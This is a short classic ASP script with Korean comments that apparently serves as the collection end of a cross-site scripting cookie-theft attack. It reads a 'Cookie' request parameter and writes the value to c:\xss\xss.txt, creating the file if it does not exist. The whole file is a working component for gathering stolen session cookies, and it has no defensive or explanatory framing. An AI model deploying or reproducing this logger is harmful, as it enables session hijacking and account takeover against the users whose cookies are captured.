<%
cookie=request("Cookie")  '쿠키값 받기

Set fs = Server.CreateObject("Scripting.FileSystemObject")
	if fs.fileexists("c:\xss\xss.txt") then
	else
		fs.createtextfile "c:\xss\xss.txt", true
	end if

Set objFile = fs.OpenTextFile("C:\xss\xss.txt",2, TRUE, 0)   '파일쓰기
objFile.writeLine("--------------------------------------------------------------")
objFile.writeLine(Cookie)
objFile.close
%>